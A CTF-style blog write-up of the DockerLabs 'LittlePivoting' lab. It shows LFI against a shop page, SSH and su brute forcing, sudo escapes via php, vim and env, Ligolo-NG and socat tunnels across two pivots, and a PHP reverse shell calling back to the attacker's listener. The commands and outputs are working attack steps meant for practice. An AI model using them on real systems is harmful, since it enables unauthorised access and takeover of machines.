---
title: "Writeup DockerLabs: LittlePivoting \"MediumBox\""
date: 2025-12-27 11:16:00 -0500
categories: [CTF, DockerLabks]
tags: [pivoting, linux]
image:
  path: /assets/img/littlepivoting/littlepivoting_main.webp
---

**Hey everyone, welcome back!**

I hope you’re all doing great as we approach the end of the year 🎄

Before closing it out, I wanted to publish this write-up about a pivoting lab that I found particularly interesting — mainly because it involves more than one pivot. Until now, I hadn’t really practiced a scenario like this, and… well, what better time to suffer a little and learn a lot?

This lab comes from DockerLabs, created by El Pinguino de Mario — all credits go to him.
You can find the lab here: The name is `LittlePivoting`

[DockerLab Link](https://dockerlabs.es/){:target="_blank"}

Alright, enough talking. Let’s get started 🚀

## Lab Setup

After downloading the lab on my Kali machine, everything comes packaged inside a .zip file.
We can unzip it and spin up the lab using the following commands:

```bash
$ unzip littlepivoting.zip
$ sudo bash auto_deploy.sh inclusion.tar trust.tar upload.tar
```
{: .nolineno }

## Target 1: Machine “inclusion”

That last command prints out the IP addresses of each machine, but let’s not make it that easy.
Instead, let’s discover them manually to keep things more realistic (and fun).

First, we need to know our own IP address:

```bash
$ ip a
[...]
5: br-c3df8567921c: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:38:a8:86:01 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.1/24 brd 10.10.10.255 scope global br-c3df8567921c
       valid_lft forever preferred_lft forever
    inet6 fe80::42:38ff:fea8:8601/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
[...]
```
{: .nolineno }

As we can see, a new interface was created on Kali called `br-c3df8567921c`. In this case, our IP address is `10.10.10.1`. Good start!

Since this lab created a new local network interface, we can perform a local ARP scan on that interface to discover other hosts.

```bash
$ sudo arp-scan -I br-c3df8567921c --localnet 
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.2      02:42:0a:0a:0a:02       (Unknown: locally administered)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.363 seconds (108.34 hosts/sec). 1 responded
```
{: .nolineno }

Perfect. There’s only one additional device besides ourselves, located at 10.10.10.2.

Let’s scan it with Nmap:

```bash
$ sudo nmap -sS -sVC -p- --min-rate 5000 10.10.10.2          
Nmap scan report for 10.10.10.2
Host is up (0.000012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
|_  256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:0A:0A:0A:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds
```
{: .nolineno }

We find only two open ports:
* 22 → SSH
* 80 → HTTP

Time to check the web service.

### Web Enumeration & LFI

Opening the page brings us to the classic Apache2 Debian Default Page.

![Page inclusion machine](/assets/img/littlepivoting/littlepivoting_1.webp)

No interesting comments, no hidden clues… so let’s fuzz it.

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.2/FUZZ -ic -e .php,.txt -v                  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
| URL | http://10.10.10.2/shop
| --> | http://10.10.10.2/shop/
    * FUZZ: shop
```
{: .nolineno }

Nice! We discover a route called `/shop`.

![Page /shop](/assets/img/littlepivoting/littlepivoting_2.webp)

At the bottom of the page, there’s a very suspicious error message: `Error de Sistema: ($_GET['archivo']");`

Well… that screams LFI, doesn’t it?

Let’s try adding the `archivo` parameter and access `/etc/passwd`.

> If you wanted to discover this parameter without such an obvious clue, you could fuzz GET parameters with `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.10.10.2/shop/?FUZZ=../../../../etc/passwd' -ic -fs 1112`
{: .prompt-tip }

And sure enough:

![File passwd](/assets/img/littlepivoting/littlepivoting_3.webp)

Using `../../../../etc/passwd` works perfectly.

> I tried different directory traversal depths until it worked. In this case, we needed to go back four directories.
{: .prompt-info }

### From LFI to Initial Access

At this point, the goal is to escalate LFI → RCE.

I spent a good amount of time trying:

* PHP wrappers
* Log poisoning
* /proc enumeration
* And many other tricks…

Nothing worked 😅

Then I stopped and thought:

> This is a pivoting lab. The entry vector is probably simple.

So I tried what, in a real engagement, is often the last resort: **Brute force**.

From `/etc/passwd`, we identify two valid users:

* manchi
* seller

Let’s try SSH brute force with Hydra.

I created a text file containing both users:

```bash
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -u -f 10.10.10.2 ssh

[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: manchi   password: ...SNIP...
[STATUS] attack finished for 10.10.10.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
{: .nolineno }

> `-u` → tries the same password against all users before moving on, while `-f` → stops as soon as valid credentials are found
{: .prompt-tip }

🎉 Bingo!
We get valid credentials for user `manchi`.

Let’s log in:

```bash
$ ssh manchi@10.10.10.2                            
manchi@10.10.10.2's password: 
[...]
Last login: Sun Apr 14 16:47:47 2024 from 172.17.0.1
manchi@dde3f6940881:~$
```
{: .nolineno }

### Privilege Escalation (Round 1)

Once inside, I tried several privilege escalation techniques… no luck.

So I reused the same logic as before and brute-forced the remaining user `seller`, but this time using `su`.

I downloaded a brute-force binary from GitHub, transferred it along with rockyou.txt, and executed it:

[Su Bruteforce GitHub](https://github.com/carlospolop/su-bruteforce){:target="_blank"}

```bash
$ scp ./suBF.sh /usr/share/wordlists/rockyou.txt manchi@10.10.10.2:/home/manchi
```
{: .nolineno }

```bash
manchi@dde3f6940881:~$ chmod +x suBF.sh 
manchi@dde3f6940881:~$ ./suBF.sh -u seller -w rockyou.txt 
  [+] Bruteforcing seller...
  You can login as seller using password: ...SNIP...
```
{: .nolineno }

Almost instantly, we get the password for seller.

Switch user and check sudo privileges:

```bash
manchi@dde3f6940881:~$ su seller
Password: 
seller@dde3f6940881:/home/manchi$ sudo -l
Matching Defaults entries for seller on dde3f6940881:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User seller may run the following commands on dde3f6940881:
    (ALL) NOPASSWD: /usr/bin/php
```
{: .nolineno }

Interesting — `seller` can execute PHP as root without a password.

GTFOBins to the rescue:

```bash
seller@dde3f6940881:/home/manchi$ sudo php -r "system('/bin/bash');"
root@dde3f6940881:/home/manchi# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

And just like that…

💥 We are root on `inclusion` machine.

### First Pivot (10.10.10.0 → 20.20.20.0)

Up to this point, we already have root access on the `inclusion` machine.
Nice. Take a breath. Enjoy the moment. This is usually where people stop in CTFs…

…but this lab is called pivoting for a reason 😈

So let’s take a look at the network interfaces on this machine:

```bash
root@cb214d9924fa:/home/manchi# hostname -I
10.10.10.2 20.20.20.2
```
{: .nolineno }

We find a second IP `20.20.20.2`

This means:

* The machine inclusion is connected to two networks
* One network we already control (`10.10.10.0/24`)
* Another one we cannot reach directly from Kali (`20.20.20.0/24`)

In other words `inclusion` is our first pivot. But why we need pivoting here?

From our Kali machine we cannot scan `20.20.20.0/24`, we cannot ping it, we cannot run Nmap directly against it. But `inclusion` can!.

So the goal is simple: Route our traffic through `inclusion` so Kali can “see” that network.

#### Ligolo-NG Setup

First, we download the Ligolo-NG binaries from the official GitHub repository.

On Kali, we need to create a TUN interface, which will act as our virtual network card for the tunnel and add routing to this network:

```bash
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 20.20.20.0/24 dev ligolo
```
{: .nolineno }

If everything goes well, Kali now has a new interface called `ligolo`.

Now we start the Ligolo proxy, which will listen for incoming agents:

```bash
$ ./proxy -selfcert  
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng »
```
{: .nolineno }

At this point:

* Kali is waiting
* Ligolo is listening
* Nothing magical has happened yet

Patience, young padawan 🧘‍♂️

Now we move to the compromised machine `inclusion` (where we are root).

We transfer the Ligolo agent binary to the machine and execute it, pointing it to our Kali IP:

```bash
$ scp ./agent manchi@10.10.10.2:/home/manchi 
manchi@10.10.10.2's password:

root@cb214d9924fa:~# chmod +x agent 
root@cb214d9924fa:~# ./agent -connect 10.10.10.1:11601 -ignore-cert &
[1] 121
root@cb214d9924fa:~# WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.10.1:11601"
```
{: .nolineno }

Once executed, the agent will initiate a connection from `inclusion` to Kali

Back on Kali, in the Ligolo console, we should see that a new agent has connected.

We can list the agents and start it:

```bash
ligolo-ng » session
? Specify a session : 1 - root@cb214d9924fa - 10.10.10.2:43212 - 02420a0a0a02
[Agent : root@cb214d9924fa] » start
INFO[0344] Starting tunnel to root@cb214d9924fa (02420a0a0a02)
```
{: .nolineno }

Now comes the fun part.

Since Kali can now “see” the `20.20.20.0/24` network, we can perform host discovery using (for example) ping sweep. You can do this in two ways: From Kali (through the tunnel), or directly from the pivot machine.

I chose to do it from Kali, because… why not?

```bash
$ for i in {1..254} ;do (ping -c 1 20.20.20.$i | grep "bytes from" &) ;done
64 bytes from 20.20.20.2: icmp_seq=1 ttl=64 time=1.77 ms
64 bytes from 20.20.20.3: icmp_seq=1 ttl=64 time=2.96 ms
```
{: .nolineno }

And there it is 🎉 We discover a live host at `20.20.20.3`. At this point, we’re ready to attack the next machine.

## Target 2: Machine "trust"

Now that we’ve successfully pivoted into the `20.20.20.0/24` network, it’s time to see what’s waiting for us on the other side.

We already discovered a live host at `20.20.20.3`. Let’s start, as always, with an Nmap scan from our Kali machine (this time through the Ligolo tunnel, which still feels a bit magical):

```bash
$ sudo nmap -sS -sVC -p- --min-rate 5000 20.20.20.3
Nmap scan report for 20.20.20.3
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds
```
{: .nolineno }

The results are familiar by now:

* 22/tcp → SSH
* 80/tcp → HTTP

No surprises, but familiar doesn’t mean harmless.

### Web Enumeration

Let’s check the web service first by opening port 80 in the browser.

![Page Trust Machine](/assets/img/littlepivoting/littlepivoting_4.webp)

Once again, we’re greeted by the good old Apache2 Debian Default Page.

As usual, nothing interesting at first glance, so we move on to fuzzing:

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://20.20.20.3/FUZZ -ic -e .php,.txt -v                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://20.20.20.3/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 927, Words: 328, Lines: 40, Duration: 4ms]
| URL | http://20.20.20.3/secret.php
    * FUZZ: secret.php
```
{: .nolineno }

This time, ffuf reveals a new path: `/secret.php`. Now that sounds promising.

When we browse to that path, we see the following message:

![Secret Trust Page](/assets/img/littlepivoting/littlepivoting_5.webp)

Two things immediately stand out:

1. There is nothing technical here — no parameters, no forms, no input
2. But there is a username: `Mario`

At this point, experience kicks in. If the application isn’t vulnerable... maybe the authentication is.

Could we keep enumerating the web app? Sure. But sometimes the lab designer is politely telling you: `Stop overthinking it.`

So yes, we go straight for SSH brute force.

```bash
$ hydra -l mario -P /usr/share/wordlists/rockyou.txt -u 20.20.20.3 ssh       

[DATA] attacking ssh://20.20.20.3:22/
[22][ssh] host: 20.20.20.3   login: mario   password: ...SNIP...
```
{: .nolineno }

And this time, the lesson sticks. Almost immediately, we obtain valid credentials for the user `mario`.

Progress is progress — even if it feels slightly repetitive 😄

### Initial Access on “trust”

We log in via SSH. Once inside, the first thing to check (as always) is sudo permissions with `sudo -l`. And here we get a very nice surprise.

The user `mario` can execute vim as root. If you’ve played CTFs before, you already know how this ends.

Quick visit to GTFOBins, and we get the required command:

```bash
$ ssh mario@20.20.20.3                             
mario@20.20.20.3's password: 
[...]
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@b537dcd517fc:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on b537dcd517fc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on b537dcd517fc:
    (ALL) /usr/bin/vim
mario@b537dcd517fc:~$ sudo /usr/bin/vim -c ':!/bin/bash'

root@b537dcd517fc:/home/mario# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

And just like that... 💥 We are root on the `trust` machine.

At this point, we fully control two machines and two networks. Which, of course, means there’s probably a third one waiting for us… 😈

### Second Pivot (20.20.20.0 → 30.30.30.0)

At this point, we have root access on the `trust` machine. Two machines owned, two networks explored… and, as expected, there’s another door hidden behind this one.

Let’s check the network interfaces:

```bash
root@b537dcd517fc:/home/mario# hostname -I
20.20.20.3 30.30.30.2
```
{: .nolineno }

Once again, we find something interesting.

In addition to the interface connected to `20.20.20.0/24`, there is another network: `30.30.30.2`.

So now the situation looks like this:

* Kali → 10.10.10.0/24
* Pivot 1 (“inclusion”) → 10.10.10.0/24 + 20.20.20.0/24
* Pivot 2 (“trust”) → 20.20.20.0/24 + 30.30.30.0/24

And here’s the important part: `trust` cannot reach Kali directly, and any traffic must go through `inclusion` first.

This means we are officially in multi-pivot territory. Take a sip of coffee ☕. This is where things get fun.

#### The Problem to Solve.

We want to:

* Run a Ligolo agent on trust
* Have it connect to Kali
* But there is no direct route

So we need ligolo for tunneling and socat for port forwarding between pivots.

First, we transfer the Ligolo agent binary to the `trust` machine. We don’t execute it yet — first we need a way for it to reach Kali.

```bash
root@cb214d9924fa:~# scp ./agent mario@20.20.20.3:/home/mario
mario@20.20.20.3's password:
```
{: .nolineno }

#### Port Forwarding with Socat (Pivot 2 → Pivot 1)

Since `trust` can talk to `inclusion`, and `inclusion` can talk to Kali, we’ll chain them.

On the first pivot (`inclusion`), we create a TCP forward using Socat:

```bash
root@cb214d9924fa:~# ./socat TCP4-LISTEN:11601,fork TCP4:10.10.10.1:11601 &
[2] 908
```
{: .nolineno }

> This means, anything that reaches me on port 11601, I’ll send straight to Kali to port 11601.
{: .prompt-tip }

This is the bridge that allows the second agent to reach home.

Because we’re about to connect another Ligolo agent, we need a second TUN interface on Kali to keep things clean. Let’s call this one `ligolo2`.

On Kali:

```bash
$ sudo ip tuntap add user $USER mode tun ligolo2
$ sudo ip link set ligolo2 up
$ sudo ip route add 30.30.30.0/24 dev ligolo2
```
{: .nolineno }

Now we can finally execute the Ligolo agent on `trust`, pointing it to `inclusion` instead of Kali:

```bash
root@b537dcd517fc:~# ./agent -connect 20.20.20.2:11601 -ignore-cert &
[1] 197
root@b537dcd517fc:~# WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="20.20.20.2:11601"
```
{: .nolineno }

> The agent connects to the first pivot on port 11601, not directly to Kali. Socat handles the forwarding behind the scenes.
{: .prompt-info }

If everything is configured correctly, the connection flows like this:
> trust → inclusion → Kali

Like a beautiful, slightly cursed network conga line 💃🕺

Back on Kali, inside the Ligolo proxy console, we should now see a second agent connected. We select it and start it:

```bash
[Agent : root@cb214d9924fa] » INFO[2157] Agent joined. id=024214141403 name=root@b537dcd517fc remote="10.10.10.2:45010"
[Agent : root@cb214d9924fa] » session
? Specify a session : 2 - root@b537dcd517fc - 10.10.10.2:45010 - 024214141403
[Agent : root@b537dcd517fc] » start --tun ligolo2
INFO[2250] Starting tunnel to root@b537dcd517fc (024214141403)
```
{: .nolineno }

Time to look for the final target. From Kali, we run a ping sweep:

```bash
$ for i in {1..254} ;do (ping -c 1 30.30.30.$i | grep "bytes from" &) ;done
64 bytes from 30.30.30.2: icmp_seq=1 ttl=64 time=4.60 ms
64 bytes from 30.30.30.3: icmp_seq=1 ttl=64 time=6.09 ms
```
{: .nolineno }

And there it is: `30.30.30.3` 🎉 We’ve successfully pivoted through two machines into a third network.

Next stop: the `upload` machine.

## Final Target: Machine “upload”

After successfully pivoting through two machines and gaining access to the `30.30.30.0/24` network, we finally identify the last host: `30.30.30.3`.

As tradition dictates, we start with an Nmap scan:

```bash
$ sudo nmap -sS -sVC -p- --min-rate 5000 30.30.30.3                        
Nmap scan report for 30.30.30.3
Host is up (0.035s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Upload here your file

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds
```
{: .nolineno }

This time, the result is… different.

Only one port is open:

* 80/tcp → HTTP

No SSH. No easy login. No quick win. Which usually means only one thing: We’re getting a shell through the web.

### Web Enumeration

Opening the page on port 80 reveals something much more interesting than Apache defaults.

![Page Upload Machine](/assets/img/littlepivoting/littlepivoting_6.webp)

There’s a file upload form.

At this point, you should hear a small voice in your head whispering:
> PHP reverse shell.

And yes, that voice is usually right. Before uploading anything, I ran a quick ffuf scan:

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://30.30.30.3/FUZZ -ic -e .php,.txt -v                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://30.30.30.3/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 1ms]
| URL | http://30.30.30.3/uploads
| --> | http://30.30.30.3/uploads/
    * FUZZ: uploads

[Status: 200, Size: 1357, Words: 499, Lines: 55, Duration: 2ms]
| URL | http://30.30.30.3/upload.php
    * FUZZ: upload.php
```
{: .nolineno }

This reveals a directory called: `/uploads`. All the pieces are in place.

### Reverse Shell Through Two Pivots

Uploading a reverse shell sounds easy... until you remember something important:

* This machine cannot reach Kali directly
* There are two pivots in between

So if we simply point the reverse shell to Kali, it will fail silently and ruin our mood.

Let’s do this properly.

#### The Connectivity Problem

The reverse shell path needs to look like this:
> upload → trust → inclusion → Kali

To make that happen, we need two port forwardings:

1. One on trust
2. One on inclusion

Yes, this is the networking equivalent of duct tape — but it works.

#### Port Forwarding: Pivot 2 → Pivot 1

First, we upload a socat binary to the `trust` machine.

On `trust`, we forward a port to the first pivot (`inclusion`):

```bash
root@b537dcd517fc:~# ./socat TCP4-LISTEN:20123,fork TCP4:20.20.20.2:20123 &
```
{: .nolineno }

#### Port Forwarding: Pivot 1 → Kali

Now, on `inclusion`, we do the same thing, but this time forwarding traffic to Kali:

```bash
root@cb214d9924fa:~# ./socat TCP4-LISTEN:20123,fork TCP4:10.10.10.1:20123 &
```
{: .nolineno }

> For this occasion, I decided to use port 20123 for all port forwarding.
{: .prompt-info }

If this feels fragile… that’s because it is. But hey, welcome to real-world pivoting 😄

#### Preparing the Reverse Shell

For the reverse shell, I used the classic PentestMonkey PHP reverse shell.

I configured it to:
* Connect to 30.30.30.2 (the IP of `trust`)
* Use port 20123

> Always point the reverse shell to the closest reachable pivot, not directly to Kali.
{: .prompt-tip }

After that, I uploaded the PHP file using the web form.

#### Listener on Kali

On Kali, I set up a listener — this time using `Penelope`:

```bash
$ penelope -p 20123                         
[+] Listening for reverse shells on 0.0.0.0:20123 →  127.0.0.1 • 10.0.2.6 • 172.17.0.1 • 10.10.10.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
{: .nolineno }

And honestly… after using it, I don’t think I’m going back to netcat:

* Automatic TTY
* Better shell handling
* Less pain overall

(This is not sponsored. I wish.)

With everything in place, I accessed the uploaded PHP file via `/uploads`.

A brief moment of suspense...

And then:

🎉 Shell received on Kali.

```bash
[+] Got reverse shell from f9c457f6fa39~10.10.10.2-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/f9c457f6fa39~10.10.10.2-Linux-x86_64/2025_12_27-18_33_54-062.log 📜

www-data@f9c457f6fa39:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{: .nolineno }

At this point, we have a shell on the final machine, traffic flowing through two pivots, and a setup that looks insane but works perfectly.

All that’s left now is one last step... Becoming root. 👑

### Final Privilege Escalation

Once inside the `upload` machine, we’re in a pretty good position already — but of course, no lab is complete without grabbing root.

As always, the first command to run is `sudo -l`. And this time, the output is surprisingly generous.

The current user can execute `/usr/bin/env` as root, without a password. GTFOBins to the Rescue (One Last Time).

A quick visit to GTFOBins confirms what we suspected.

Using `env`, we can spawn a root shell with a very simple command:

```bash
www-data@f9c457f6fa39:/$ sudo /usr/bin/env /bin/bash
root@f9c457f6fa39:/# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

And just like that... 💥 We are root on the final machine.

## Final Thoughts

This lab is an excellent exercise in real-world pivoting concepts:

* Identifying multi-homed machines
* Thinking in terms of network paths, not just exploits
* Using tools like Ligolo-NG and Socat together
* Understanding why reverse shells often fail in segmented environments

More importantly, it reinforces a critical mindset:

> Not every problem needs a complex exploit. Sometimes the intended path is the simplest one — if you stop overthinking.

If multi-pivoting ever felt confusing or intimidating, I highly recommend this lab.

Once you understand how traffic flows, everything starts to click.

And yes… it does feel incredibly satisfying when your shell finally lands after crossing two pivots.

Thanks for reading, and happy hacking 🚀